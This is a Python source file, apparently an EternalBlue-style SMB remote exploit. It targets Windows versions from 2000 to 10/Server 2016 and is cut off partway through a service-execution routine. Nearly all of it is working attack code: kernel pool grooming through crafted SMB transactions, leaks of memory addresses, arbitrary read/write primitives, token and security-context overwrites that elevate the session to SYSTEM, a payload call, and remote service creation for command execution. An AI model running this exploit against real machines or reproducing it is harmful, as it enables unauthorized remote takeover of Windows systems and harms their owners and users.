#!/usr/bin/python

import re
import os
import sys
import time
import Queue
import socket
import struct
import logging
import ipaddress
import threading
from impacket import smb, smbconnection, nt_errors
from smb_module import MYSMB
from struct import pack, unpack, unpack_from
from impacket.uuid import uuidtup_to_bin
from impacket.dcerpc.v5.rpcrt import DCERPCException
from ctypes import *
from time import sleep


banner = r"""
#########################################################
#                                                       #
#     _____ ____  _____ _  __                           #
#    | ____| __ )| ____| |/ /                           #
#    |  _| |  _ \|  _| | ' /                            #
#    | |___| |_) | |___| . \  (EternalBlue-EK)          #
#    |_____|____/|_____|_|\_\            v2.0           #
#                                                       #
#                                                       #
#########################################################
"""

USERNAME = ""
PASSWORD = ""

WIN7_64_SESSION_INFO = {
	'SESSION_SECCTX_OFFSET': 0xa0,
	'SESSION_ISNULL_OFFSET': 0xba,
	'FAKE_SECCTX': pack('<IIQQIIB', 0x28022a, 1, 0, 0, 2, 0, 1),
	'SECCTX_SIZE': 0x28,
}

WIN7_32_SESSION_INFO = {
	'SESSION_SECCTX_OFFSET': 0x80,
	'SESSION_ISNULL_OFFSET': 0x96,
	'FAKE_SECCTX': pack('<IIIIIIB', 0x1c022a, 1, 0, 0, 2, 0, 1),
	'SECCTX_SIZE': 0x1c,
}


WIN8_64_SESSION_INFO = {
	'SESSION_SECCTX_OFFSET': 0xb0,
	'SESSION_ISNULL_OFFSET': 0xca,
	'FAKE_SECCTX': pack('<IIQQQQIIB', 0x38022a, 1, 0, 0, 0, 0, 2, 0, 1),
	'SECCTX_SIZE': 0x38,
}

WIN8_32_SESSION_INFO = {
	'SESSION_SECCTX_OFFSET': 0x88,
	'SESSION_ISNULL_OFFSET': 0x9e,
	'FAKE_SECCTX': pack('<IIIIIIIIB', 0x24022a, 1, 0, 0, 0, 0, 2, 0, 1),
	'SECCTX_SIZE': 0x24,
}


WIN2K3_64_SESSION_INFO = {
	'SESSION_ISNULL_OFFSET': 0xba,
	'SESSION_SECCTX_OFFSET': 0xa0,  
	'SECCTX_PCTXTHANDLE_OFFSET': 0x10,  
	'PCTXTHANDLE_TOKEN_OFFSET': 0x40,
	'TOKEN_USER_GROUP_CNT_OFFSET': 0x4c,
	'TOKEN_USER_GROUP_ADDR_OFFSET': 0x68,
}

WIN2K3_32_SESSION_INFO = {
	'SESSION_ISNULL_OFFSET': 0x96,
	'SESSION_SECCTX_OFFSET': 0x80,  
	'SECCTX_PCTXTHANDLE_OFFSET': 0xc,  
	'PCTXTHANDLE_TOKEN_OFFSET': 0x24,
	'TOKEN_USER_GROUP_CNT_OFFSET': 0x4c,
	'TOKEN_USER_GROUP_ADDR_OFFSET': 0x68,
}


WINXP_32_SESSION_INFO = {
	'SESSION_ISNULL_OFFSET': 0x94,
	'SESSION_SECCTX_OFFSET': 0x84,  
	'PCTXTHANDLE_TOKEN_OFFSET': 0x24,
	'TOKEN_USER_GROUP_CNT_OFFSET': 0x4c,
	'TOKEN_USER_GROUP_ADDR_OFFSET': 0x68,
}

WIN2K_32_SESSION_INFO = {
	'SESSION_ISNULL_OFFSET': 0x94,
	'SESSION_SECCTX_OFFSET': 0x84,  
	'PCTXTHANDLE_TOKEN_OFFSET': 0x24,
	'TOKEN_USER_GROUP_CNT_OFFSET': 0x3c,
	'TOKEN_USER_GROUP_ADDR_OFFSET': 0x58,
}


WIN7_32_TRANS_INFO = {
	'TRANS_SIZE' : 0xa0,  
	'TRANS_FLINK_OFFSET' : 0x18,
	'TRANS_INPARAM_OFFSET' : 0x40,
	'TRANS_OUTPARAM_OFFSET' : 0x44,
	'TRANS_INDATA_OFFSET' : 0x48,
	'TRANS_OUTDATA_OFFSET' : 0x4c,
	'TRANS_PARAMCNT_OFFSET' : 0x58,
	'TRANS_TOTALPARAMCNT_OFFSET' : 0x5c,
	'TRANS_FUNCTION_OFFSET' : 0x72,
	'TRANS_MID_OFFSET' : 0x80,
}

WIN7_64_TRANS_INFO = {
	'TRANS_SIZE' : 0xf8,  
	'TRANS_FLINK_OFFSET' : 0x28,
	'TRANS_INPARAM_OFFSET' : 0x70,
	'TRANS_OUTPARAM_OFFSET' : 0x78,
	'TRANS_INDATA_OFFSET' : 0x80,
	'TRANS_OUTDATA_OFFSET' : 0x88,
	'TRANS_PARAMCNT_OFFSET' : 0x98,
	'TRANS_TOTALPARAMCNT_OFFSET' : 0x9c,
	'TRANS_FUNCTION_OFFSET' : 0xb2,
	'TRANS_MID_OFFSET' : 0xc0,
}

WIN5_32_TRANS_INFO = {
	'TRANS_SIZE' : 0x98,  
	'TRANS_FLINK_OFFSET' : 0x18,
	'TRANS_INPARAM_OFFSET' : 0x3c,
	'TRANS_OUTPARAM_OFFSET' : 0x40,
	'TRANS_INDATA_OFFSET' : 0x44,
	'TRANS_OUTDATA_OFFSET' : 0x48,
	'TRANS_PARAMCNT_OFFSET' : 0x54,
	'TRANS_TOTALPARAMCNT_OFFSET' : 0x58,
	'TRANS_FUNCTION_OFFSET' : 0x6e,
	'TRANS_PID_OFFSET' : 0x78,
	'TRANS_MID_OFFSET' : 0x7c,
}

WIN5_64_TRANS_INFO = {
	'TRANS_SIZE' : 0xe0,  
	'TRANS_FLINK_OFFSET' : 0x28,
	'TRANS_INPARAM_OFFSET' : 0x68,
	'TRANS_OUTPARAM_OFFSET' : 0x70,
	'TRANS_INDATA_OFFSET' : 0x78,
	'TRANS_OUTDATA_OFFSET' : 0x80,
	'TRANS_PARAMCNT_OFFSET' : 0x90,
	'TRANS_TOTALPARAMCNT_OFFSET' : 0x94,
	'TRANS_FUNCTION_OFFSET' : 0xaa,
	'TRANS_PID_OFFSET' : 0xb4,
	'TRANS_MID_OFFSET' : 0xb8,
}

X86_INFO = {
	'ARCH' : 'x86',
	'PTR_SIZE' : 4,
	'PTR_FMT' : 'I',
	'FRAG_TAG_OFFSET' : 12,
	'POOL_ALIGN' : 8,
	'SRV_BUFHDR_SIZE' : 8,
}

X64_INFO = {
	'ARCH' : 'x64',
	'PTR_SIZE' : 8,
	'PTR_FMT' : 'Q',
	'FRAG_TAG_OFFSET' : 0x14,
	'POOL_ALIGN' : 0x10,
	'SRV_BUFHDR_SIZE' : 0x10,
}


def merge_dicts(*dict_args):
	result = {}
	for dictionary in dict_args:
		result.update(dictionary)
	return result

OS_ARCH_INFO = {
	
	'WIN7': {
		'x86': merge_dicts(X86_INFO, WIN7_32_TRANS_INFO, WIN7_32_SESSION_INFO),
		'x64': merge_dicts(X64_INFO, WIN7_64_TRANS_INFO, WIN7_64_SESSION_INFO),
	},
	
	'WIN8': {
		'x86': merge_dicts(X86_INFO, WIN7_32_TRANS_INFO, WIN8_32_SESSION_INFO),
		'x64': merge_dicts(X64_INFO, WIN7_64_TRANS_INFO, WIN8_64_SESSION_INFO),
	},
	'WINXP': {
		'x86': merge_dicts(X86_INFO, WIN5_32_TRANS_INFO, WINXP_32_SESSION_INFO),
		'x64': merge_dicts(X64_INFO, WIN5_64_TRANS_INFO, WIN2K3_64_SESSION_INFO),
	},
	'WIN2K3': {
		'x86': merge_dicts(X86_INFO, WIN5_32_TRANS_INFO, WIN2K3_32_SESSION_INFO),
		'x64': merge_dicts(X64_INFO, WIN5_64_TRANS_INFO, WIN2K3_64_SESSION_INFO),
	},
	'WIN2K': {
		'x86': merge_dicts(X86_INFO, WIN5_32_TRANS_INFO, WIN2K_32_SESSION_INFO),
	},
}


TRANS_NAME_LEN = 4
HEAP_HDR_SIZE = 8  


def calc_alloc_size(size, align_size):
	return (size + align_size - 1) & ~(align_size-1)

def wait_for_request_processed(conn):
	conn.send_echo('a')

def find_named_pipe(conn):
	pipes = [ 'browser', 'spoolss', 'netlogon', 'lsarpc', 'samr' ]
	
	tid = conn.tree_connect_andx('\\\\'+conn.get_remote_host()+'\\'+'IPC$')
	found_pipe = None
	for pipe in pipes:
		try:
			fid = conn.nt_create_andx(tid, pipe)
			conn.close(tid, fid)
			found_pipe = pipe
		except smb.SessionError as e:
			pass
	
	conn.disconnect_tree(tid)
	return found_pipe


special_mid = 0
extra_last_mid = 0
def reset_extra_mid(conn):
	global extra_last_mid, special_mid
	special_mid = (conn.next_mid() & 0xff00) - 0x100
	extra_last_mid = special_mid
	
def next_extra_mid():
	global extra_last_mid
	extra_last_mid += 1
	return extra_last_mid


GROOM_TRANS_SIZE = 0x5010

def leak_frag_size(conn, tid, fid):
	
	info = {}
	
	mid = conn.next_mid()
	req1 = conn.create_nt_trans_packet(5, param=pack('<HH', fid, 0), mid=mid, data='A'*0x10d0, maxParameterCount=GROOM_TRANS_SIZE-0x10d0-TRANS_NAME_LEN)
	req2 = conn.create_nt_trans_secondary_packet(mid, data='B'*276) 
	
	conn.send_raw(req1[:-8])
	conn.send_raw(req1[-8:]+req2)
	leakData = conn.recv_transaction_data(mid, 0x10d0+276)
	leakData = leakData[0x10d4:]  
	
	if leakData[X86_INFO['FRAG_TAG_OFFSET']:X86_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':
		print(" Target is 32 Bit")
		info['arch'] = 'x86'
		info['FRAG_POOL_SIZE'] = ord(leakData[ X86_INFO['FRAG_TAG_OFFSET']-2 ]) * X86_INFO['POOL_ALIGN']
	elif leakData[X64_INFO['FRAG_TAG_OFFSET']:X64_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':
		print(" Target is 64 Bit")
		info['arch'] = 'x64'
		info['FRAG_POOL_SIZE'] = ord(leakData[ X64_INFO['FRAG_TAG_OFFSET']-2 ]) * X64_INFO['POOL_ALIGN']
	else:
		print(" Tag Leak Data not found in Frag Pool")
	
	print(" Got Frag size: 0x{:x}".format(info['FRAG_POOL_SIZE']))
	return info


def read_data(conn, info, read_addr, read_size):
	fmt = info['PTR_FMT']
	
	new_data = pack('<'+fmt*3, info['trans2_addr']+info['TRANS_FLINK_OFFSET'], info['trans2_addr']+0x200, read_addr)  
	new_data += pack('<II', 0, 0)  
	new_data += pack('<III', 8, 8, 8)  
	new_data += pack('<III', read_size, read_size, read_size) 
	new_data += pack('<HH', 0, 5)  
	conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=new_data, dataDisplacement=info['TRANS_OUTPARAM_OFFSET'])
	
	conn.send_nt_trans(5, param=pack('<HH', info['fid'], 0), totalDataCount=0x4300-0x20, totalParameterCount=0x1000)

	conn.send_nt_trans_secondary(mid=info['trans2_mid'])
	read_data = conn.recv_transaction_data(info['trans2_mid'], 8+read_size)
	
	info['trans2_addr'] = unpack_from('<'+fmt, read_data)[0] - info['TRANS_FLINK_OFFSET']
	
	conn.send_nt_trans_secondary(mid=info['trans1_mid'], param=pack('<'+fmt, info['trans2_addr']), paramDisplacement=info['TRANS_INDATA_OFFSET'])
	wait_for_request_processed(conn)

	conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('<H', info['trans2_mid']), dataDisplacement=info['TRANS_MID_OFFSET'])
	wait_for_request_processed(conn)
	
	return read_data[8:]  

def write_data(conn, info, write_addr, write_data):
	
	conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('<'+info['PTR_FMT'], write_addr), dataDisplacement=info['TRANS_INDATA_OFFSET'])
	wait_for_request_processed(conn)
	
	
	conn.send_nt_trans_secondary(mid=info['trans2_mid'], data=write_data)
	wait_for_request_processed(conn)


def align_transaction_and_leak(conn, tid, fid, info, numFill=4):
	trans_param = pack('<HH', fid, 0)  
	
	for i in range(numFill):
		conn.send_nt_trans(5, param=trans_param, totalDataCount=0x10d0, maxParameterCount=GROOM_TRANS_SIZE-0x10d0)

	mid_ntrename = conn.next_mid()
	
	req1 = conn.create_nt_trans_packet(5, param=trans_param, mid=mid_ntrename, data='A'*0x10d0, maxParameterCount=info['GROOM_DATA_SIZE']-0x10d0)
	req2 = conn.create_nt_trans_secondary_packet(mid_ntrename, data='B'*276) 
	
	req3 = conn.create_nt_trans_packet(5, param=trans_param, mid=fid, totalDataCount=info['GROOM_DATA_SIZE']-0x1000, maxParameterCount=0x1000)
	
	reqs = []
	for i in range(12):
		mid = next_extra_mid()
		reqs.append(conn.create_trans_packet('', mid=mid, param=trans_param, totalDataCount=info['BRIDE_DATA_SIZE']-0x200, totalParameterCount=0x200, maxDataCount=0, maxParameterCount=0))

	conn.send_raw(req1[:-8])
	conn.send_raw(req1[-8:]+req2+req3+''.join(reqs))
	

	leakData = conn.recv_transaction_data(mid_ntrename, 0x10d0+276)
	leakData = leakData[0x10d4:]  
	

	if leakData[info['FRAG_TAG_OFFSET']:info['FRAG_TAG_OFFSET']+4] != 'Frag':
		print(" Frag Pool Tag not found in Leak Data") 
		return None
	
	
	leakData = leakData[info['FRAG_TAG_OFFSET']-4+info['FRAG_POOL_SIZE']:]
	
	expected_size = pack('<H', info['BRIDE_TRANS_SIZE'])
	leakTransOffset = info['POOL_ALIGN'] + info['SRV_BUFHDR_SIZE']
	if leakData[0x4:0x8] != 'LStr' or leakData[info['POOL_ALIGN']:info['POOL_ALIGN']+2] != expected_size or leakData[leakTransOffset+2:leakTransOffset+4] != expected_size:
		print(" No transaction structure in Leak Data ")
		return None

	leakTrans = leakData[leakTransOffset:]

	ptrf = info['PTR_FMT']
	_, connection_addr, session_addr, treeconnect_addr, flink_value = unpack_from('<'+ptrf*5, leakTrans, 8)
	inparam_value = unpack_from('<'+ptrf, leakTrans, info['TRANS_INPARAM_OFFSET'])[0]
	leak_mid = unpack_from('<H', leakTrans, info['TRANS_MID_OFFSET'])[0]

	print(" Connection: 0x{:x}".format(connection_addr))
	print(" Session: 0x{:x}".format(session_addr))
	print(" FLink: 0x{:x}".format(flink_value))
	print(" InParam: 0x{:x}".format(inparam_value))
	print(" Mid: 0x{:x}".format(leak_mid))

	next_page_addr = (inparam_value & 0xfffffffffffff000) + 0x1000
	if next_page_addr + info['GROOM_POOL_SIZE'] + info['FRAG_POOL_SIZE'] + info['POOL_ALIGN'] + info['SRV_BUFHDR_SIZE'] + info['TRANS_FLINK_OFFSET'] != flink_value:
		print(" Unexpected Alignment, diff: 0x{:x}".format(flink_value - next_page_addr))
		return None
	
	return {
		'connection': connection_addr,
		'session': session_addr,
		'next_page_addr': next_page_addr,
		'trans1_mid': leak_mid,
		'trans1_addr': inparam_value - info['TRANS_SIZE'] - TRANS_NAME_LEN,
		'trans2_addr': flink_value - info['TRANS_FLINK_OFFSET'],
	}

def exploit_matched_pairs(conn, pipe_name, info):
	
	tid = conn.tree_connect_andx('\\\\'+conn.get_remote_host()+'\\'+'IPC$')
	conn.set_default_tid(tid)
	
	fid = conn.nt_create_andx(tid, pipe_name)
	
	info.update(leak_frag_size(conn, tid, fid))
	
	info.update(OS_ARCH_INFO[info['os']][info['arch']])
	
	info['GROOM_POOL_SIZE'] = calc_alloc_size(GROOM_TRANS_SIZE + info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'], info['POOL_ALIGN'])
	print(" Groom Pool Size: 0x{:x}".format(info['GROOM_POOL_SIZE']))
	
	info['GROOM_DATA_SIZE'] = GROOM_TRANS_SIZE - TRANS_NAME_LEN - 4 - info['TRANS_SIZE'] 

	bridePoolSize = 0x1000 - (info['GROOM_POOL_SIZE'] & 0xfff) - info['FRAG_POOL_SIZE']
	info['BRIDE_TRANS_SIZE'] = bridePoolSize - (info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'])
	print(" Bride Trans Size: 0x{:x}".format(info['BRIDE_TRANS_SIZE']))
	
	info['BRIDE_DATA_SIZE'] = info['BRIDE_TRANS_SIZE'] - TRANS_NAME_LEN - info['TRANS_SIZE']
	
	leakInfo = None
	
	for i in range(10):
		reset_extra_mid(conn)
		leakInfo = align_transaction_and_leak(conn, tid, fid, info)
		if leakInfo is not None:
			break
		print(" SMB Leak Failed: Trying again...")
		conn.close(tid, fid)
		conn.disconnect_tree(tid)
		
		tid = conn.tree_connect_andx('\\\\'+conn.get_remote_host()+'\\'+'IPC$')
		conn.set_default_tid(tid)
		fid = conn.nt_create_andx(tid, pipe_name)

	if leakInfo is None:
		return False
	
	info['fid'] = fid
	hfid = "2343593"
	info.update(leakInfo)
	shift_indata_byte = 0x200
	conn.do_write_andx_raw_pipe(fid, 'A'*shift_indata_byte)

	indata_value = info['next_page_addr'] + info['TRANS_SIZE'] + 8 + info['SRV_BUFHDR_SIZE'] + 0x1000 + shift_indata_byte
	indata_next_trans_displacement = info['trans2_addr'] - indata_value
	conn.send_nt_trans_secondary(mid=fid, data='\x00', dataDisplacement=indata_next_trans_displacement + info['TRANS_MID_OFFSET'])
	wait_for_request_processed(conn)

	
	recvPkt = conn.send_nt_trans(5, mid=special_mid, param=pack('<HH', fid, 0), data='')
	if recvPkt.getNTStatus() != 0x10002: 
		print(" Unexpected return status: 0x{:x}".format(recvPkt.getNTStatus()))
		print(" *** Wrote to the wrong place ***")
		print(" The Target may have crashed...BSOD Style!")
		return False

	print(" Success Controlling Groom Transaction")

	
	print(" Modifying Transaction Structure for Arbitrary Read/Write...")
	fmt = info['PTR_FMT']
	
	conn.send_nt_trans_secondary(mid=fid, data=pack('<'+fmt, info['trans1_addr']), dataDisplacement=indata_next_trans_displacement + info['TRANS_INDATA_OFFSET'])
	wait_for_request_processed(conn)

	conn.send_nt_trans_secondary(mid=special_mid, data=pack('<'+fmt*3, info['trans1_addr'], info['trans1_addr']+0x200, info['trans2_addr']), dataDisplacement=info['TRANS_INPARAM_OFFSET'])
	wait_for_request_processed(conn)

	info['trans2_mid'] = conn.next_mid()
	conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('<H', info['trans2_mid']), dataDisplacement=info['TRANS_MID_OFFSET'])
	return True
	

def exploit_fish_barrel(conn, pipe_name, info):
	
	tid = conn.tree_connect_andx('\\\\'+conn.get_remote_host()+'\\'+'IPC$')
	conn.set_default_tid(tid)
	
	fid = conn.nt_create_andx(tid, pipe_name)
	info['fid'] = fid

	if info['os'] == 'WIN7' and 'arch' not in info:
		info.update(leak_frag_size(conn, tid, fid))
	
	if 'arch' in info:
		info.update(OS_ARCH_INFO[info['os']][info['arch']])
		attempt_list = [ OS_ARCH_INFO[info['os']][info['arch']] ]
	else:
		attempt_list = [ OS_ARCH_INFO[info['os']]['x64'], OS_ARCH_INFO[info['os']]['x86'] ]
	
	
	print(" Grooming Packets...")
	trans_param = pack('<HH', info['fid'], 0)
	for i in range(12):
		mid = info['fid'] if i == 8 else next_extra_mid()
		conn.send_trans('', mid=mid, param=trans_param, totalParameterCount=0x100-TRANS_NAME_LEN, totalDataCount=0xec0, maxParameterCount=0x40, maxDataCount=0) 
	
	shift_indata_byte = 0x200
	conn.do_write_andx_raw_pipe(info['fid'], 'A'*shift_indata_byte)
	
	success = False
	for tinfo in attempt_list:
		print(" Attempting to control next transaction on " + tinfo['ARCH'])
		HEAP_CHUNK_PAD_SIZE = (tinfo['POOL_ALIGN'] - (tinfo['TRANS_SIZE']+HEAP_HDR_SIZE) % tinfo['POOL_ALIGN']) % tinfo['POOL_ALIGN']
		NEXT_TRANS_OFFSET = 0xf00 - shift_indata_byte + HEAP_CHUNK_PAD_SIZE + HEAP_HDR_SIZE

		conn.send_trans_secondary(mid=info['fid'], data='\x00', dataDisplacement=NEXT_TRANS_OFFSET+tinfo['TRANS_MID_OFFSET'])
		wait_for_request_processed(conn)

		recvPkt = conn.send_nt_trans(5, mid=special_mid, param=trans_param, data='')
		if recvPkt.getNTStatus() == 0x10002:  
			print(" Success controlling one transaction")
			success = True
			if 'arch' not in info:
				print(" Target is "+tinfo['ARCH'])
				info['arch'] = tinfo['ARCH']
				info.update(OS_ARCH_INFO[info['os']][info['arch']])
			break
		if recvPkt.getNTStatus() != 0:
			print(" Unexpected Return Status: 0x{:x}".format(recvPkt.getNTStatus()))
	
	if not success:
		print(" Unexpected return status: 0x{:x}".format(recvPkt.getNTStatus()))
		print(" *** Wrote to the wrong place *** ")
		print(" The Target may have crashed...BSOD Style!")
		return False

	
	print(" Modifying Parameter count to 0xffffffff to write backwards...")
	conn.send_trans_secondary(mid=info['fid'], data='\xff'*4, dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_TOTALPARAMCNT_OFFSET'])

	if info['arch'] == 'x64':
		conn.send_trans_secondary(mid=info['fid'], data='\xff'*4, dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_INPARAM_OFFSET']+4)
	wait_for_request_processed(conn)
	
	TRANS_CHUNK_SIZE = HEAP_HDR_SIZE + info['TRANS_SIZE'] + 0x1000 + HEAP_CHUNK_PAD_SIZE
	PREV_TRANS_DISPLACEMENT = TRANS_CHUNK_SIZE + info['TRANS_SIZE'] + TRANS_NAME_LEN
	PREV_TRANS_OFFSET = 0x100000000 - PREV_TRANS_DISPLACEMENT

	conn.send_nt_trans_secondary(mid=special_mid, param='\xff'*4, paramDisplacement=PREV_TRANS_OFFSET+info['TRANS_TOTALPARAMCNT_OFFSET'])
	if info['arch'] == 'x64':
		conn.send_nt_trans_secondary(mid=special_mid, param='\xff'*4, paramDisplacement=PREV_TRANS_OFFSET+info['TRANS_INPARAM_OFFSET']+4)
		conn.send_trans_secondary(mid=info['fid'], data='\x00'*4, dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_INPARAM_OFFSET']+4)
	wait_for_request_processed(conn)

	print(" Checking Next SMB Transaction Leak...")

	conn.send_trans_secondary(mid=info['fid'], data='\x05', dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_FUNCTION_OFFSET'])
	
	conn.send_trans_secondary(mid=info['fid'], data=pack('<IIIII', 4, 4, 4, 0x100, 0x100), dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_PARAMCNT_OFFSET'])

	conn.send_nt_trans_secondary(mid=special_mid)
	leakData = conn.recv_transaction_data(special_mid, 0x100)
	leakData = leakData[4:] 

	if unpack_from('<H', leakData, HEAP_CHUNK_PAD_SIZE)[0] != (TRANS_CHUNK_SIZE // info['POOL_ALIGN']):
		print(" Chunk Size is invalid")
		return False

	leakTranOffset = HEAP_CHUNK_PAD_SIZE + HEAP_HDR_SIZE
	leakTrans = leakData[leakTranOffset:]
	fmt = info['PTR_FMT']
	_, connection_addr, session_addr, treeconnect_addr, flink_value = unpack_from('<'+fmt*5, leakTrans, 8)
	inparam_value, outparam_value, indata_value = unpack_from('<'+fmt*3, leakTrans, info['TRANS_INPARAM_OFFSET'])
	trans2_mid = unpack_from('<H', leakTrans, info['TRANS_MID_OFFSET'])[0]
	
	print(" Connection: 0x{:x}".format(connection_addr))
	print(" Session: 0x{:x}".format(session_addr))
	print(" FLink: 0x{:x}".format(flink_value))
	print(" InData: 0x{:x}".format(indata_value))
	print(" Mid: 0x{:x}".format(trans2_mid))
	
	trans2_addr = inparam_value - info['TRANS_SIZE'] - TRANS_NAME_LEN
	trans1_addr = trans2_addr - TRANS_CHUNK_SIZE * 2
	print(" Trans1: 0x{:x}".format(trans1_addr))
	print(" Trans2: 0x{:x}".format(trans2_addr))
	
	print(" Modifying Transaction Structure for Arbitrary Read/Write...")
	
	TRANS_OFFSET = 0x100000000 - (info['TRANS_SIZE'] + TRANS_NAME_LEN)
	conn.send_nt_trans_secondary(mid=info['fid'], param=pack('<'+fmt*3, trans1_addr, trans1_addr+0x200, trans2_addr), paramDisplacement=TRANS_OFFSET+info['TRANS_INPARAM_OFFSET'])
	wait_for_request_processed(conn)
	
	trans1_mid = conn.next_mid()
	conn.send_trans_secondary(mid=info['fid'], param=pack('<H', trans1_mid), paramDisplacement=info['TRANS_MID_OFFSET'])
	wait_for_request_processed(conn)
	
	info.update({
		'connection': connection_addr,
		'session': session_addr,
		'trans1_mid': trans1_mid,
		'trans1_addr': trans1_addr,
		'trans2_mid': trans2_mid,
		'trans2_addr': trans2_addr,
	})
	return True

def create_fake_SYSTEM_UserAndGroups(conn, info, userAndGroupCount, userAndGroupsAddr):
	SID_SYSTEM = pack('<BB5xB'+'I', 1, 1, 5, 18)
	SID_ADMINISTRATORS = pack('<BB5xB'+'II', 1, 2, 5, 32, 544)
	SID_AUTHENICATED_USERS = pack('<BB5xB'+'I', 1, 1, 5, 11)
	SID_EVERYONE = pack('<BB5xB'+'I', 1, 1, 1, 0)
	
	sids = [ SID_SYSTEM, SID_ADMINISTRATORS, SID_EVERYONE, SID_AUTHENICATED_USERS ]
	
	attrs = [ 0, 0xe, 7, 7 ]
	
	fakeUserAndGroupCount = min(userAndGroupCount, 4)
	fakeUserAndGroupsAddr = userAndGroupsAddr
	
	addr = fakeUserAndGroupsAddr + (fakeUserAndGroupCount * info['PTR_SIZE'] * 2)
	fakeUserAndGroups = ''
	for sid, attr in zip(sids[:fakeUserAndGroupCount], attrs[:fakeUserAndGroupCount]):
		fakeUserAndGroups += pack('<'+info['PTR_FMT']*2, addr, attr)
		addr += len(sid)
	fakeUserAndGroups += ''.join(sids[:fakeUserAndGroupCount])
	
	return fakeUserAndGroupCount, fakeUserAndGroups


def exploit(target, pipe_name):
	conn = MYSMB(target)
	
	conn.get_socket().setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

	info = {}

	conn.login(USERNAME, PASSWORD, maxBufferSize=4356)
	server_os = conn.get_server_os()
	print(" Target OS: "+server_os)
	if server_os.startswith("Windows 7 ") or server_os.startswith("Windows Server 2008 R2"):
		info['os'] = 'WIN7'
		info['method'] = exploit_matched_pairs
	elif server_os.startswith("Windows 8") or server_os.startswith("Windows Server 2012 ") or server_os.startswith("Windows Server 2016 ") or server_os.startswith("Windows 10"):
		info['os'] = 'WIN8'
		info['method'] = exploit_matched_pairs
	elif server_os.startswith("Windows Server (R) 2008") or server_os.startswith('Windows Vista'):
		info['os'] = 'WIN7'
		info['method'] = exploit_fish_barrel
	elif server_os.startswith("Windows Server 2003 "):
		info['os'] = 'WIN2K3'
		info['method'] = exploit_fish_barrel
	elif server_os.startswith("Windows 5.1"):
		info['os'] = 'WINXP'
		info['arch'] = 'x86'
		info['method'] = exploit_fish_barrel
	elif server_os.startswith("Windows XP "):
		info['os'] = 'WINXP'
		info['arch'] = 'x64'
		info['method'] = exploit_fish_barrel
	elif server_os.startswith("Windows 5.0"):
		info['os'] = 'WIN2K'
		info['arch'] = 'x86'
		info['method'] = exploit_fish_barrel
	else:
		print(" The target is not supported by this exploit method.")
	
	if pipe_name is None:
		pipe_name = find_named_pipe(conn)
		if pipe_name is None:
			print(" No accessible SMB Pipe Names found.")
			return False
		print(" Using SMB Pipe Name: "+pipe_name)

	if not info['method'](conn, pipe_name, info):
		return False

	
	fmt = info['PTR_FMT']
	
	print(" Elevating SMB Session to SYSTEM")
	
	write_data(conn, info, info['session']+info['SESSION_ISNULL_OFFSET'], '\x00\x01')

	sessionData = read_data(conn, info, info['session'], 0x100)
	secCtxAddr = unpack_from('<'+fmt, sessionData, info['SESSION_SECCTX_OFFSET'])[0]

	if 'PCTXTHANDLE_TOKEN_OFFSET' in info:
		
		if 'SECCTX_PCTXTHANDLE_OFFSET' in info:
			pctxtDataInfo = read_data(conn, info, secCtxAddr+info['SECCTX_PCTXTHANDLE_OFFSET'], 8)
			pctxtDataAddr = unpack_from('<'+fmt, pctxtDataInfo)[0]
		else:
			pctxtDataAddr = secCtxAddr

		tokenAddrInfo = read_data(conn, info, pctxtDataAddr+info['PCTXTHANDLE_TOKEN_OFFSET'], 8)
		tokenAddr = unpack_from('<'+fmt, tokenAddrInfo)[0]
		print(" Current Token addr: 0x{:x}".format(tokenAddr))
		
		tokenData = read_data(conn, info, tokenAddr, 0x40*info['PTR_SIZE'])
		
		userAndGroupCount = unpack_from('<I', tokenData, info['TOKEN_USER_GROUP_CNT_OFFSET'])[0]
		userAndGroupsAddr = unpack_from('<'+fmt, tokenData, info['TOKEN_USER_GROUP_ADDR_OFFSET'])[0]
		print(" UserAndGroupCount: 0x{:x}".format(userAndGroupCount))
		print(" UserAndGroupsAddr: 0x{:x}".format(userAndGroupsAddr))

		print(" Overwriting Token UserAndGroup")
		
		fakeUserAndGroupCount, fakeUserAndGroups = create_fake_SYSTEM_UserAndGroups(conn, info, userAndGroupCount, userAndGroupsAddr)
		if fakeUserAndGroupCount != userAndGroupCount:
			write_data(conn, info, tokenAddr+info['TOKEN_USER_GROUP_CNT_OFFSET'], pack('<I', fakeUserAndGroupCount))
		write_data(conn, info, userAndGroupsAddr, fakeUserAndGroups)
	else:
		secCtxData = read_data(conn, info, secCtxAddr, info['SECCTX_SIZE'])

		print(" Overwriting Session Security Context")
		
		write_data(conn, info, secCtxAddr, info['FAKE_SECCTX'])

	
	try:
		payload_opts(conn, info['arch'])
	except:
		# sys.exit()
		pass

	
	if 'PCTXTHANDLE_TOKEN_OFFSET' in info:
		userAndGroupsOffset = userAndGroupsAddr - tokenAddr
		write_data(conn, info, userAndGroupsAddr, tokenData[userAndGroupsOffset:userAndGroupsOffset+len(fakeUserAndGroups)])
		if fakeUserAndGroupCount != userAndGroupCount:
			write_data(conn, info, tokenAddr+info['TOKEN_USER_GROUP_CNT_OFFSET'], pack('<I', userAndGroupCount))
	else:
		write_data(conn, info, secCtxAddr, secCtxData)

	conn.disconnect_tree(conn.get_tid())
	conn.logoff()
	conn.get_socket().close()
	return True


def smb_send_file(smbConn, localSrc, remoteDrive, remotePath):
	with open(localSrc, 'rb') as fp:
		smbConn.putFile(remoteDrive + '$', remotePath, fp.read)


def service_exec(conn, cmd):
	import random
	import string
	from impacket.dcerpc.v5 import transport, srvs, scmr
	
	service_name = ''.join([random.choice(string.letters) for i in range(6)])

	rpcsvc = conn.get_dce_rpc('svcctl')
	rpcsvc.connect()
	rpcsvc.bind(scmr.MSRPC_UUID_SCMR)
	svcHandle = None
	try:
		print(" Opening SVCManager on %s..." % conn.get_remote_host())
		resp = scmr.hROpenSCManagerW(rpcsvc)
		svcHandle = resp['lpScHandle']
		
		
		try:
			resp = scmr.hROpenServiceW(rpcsvc, svcHandle, service_name+'\x00')
		except Exception as e:
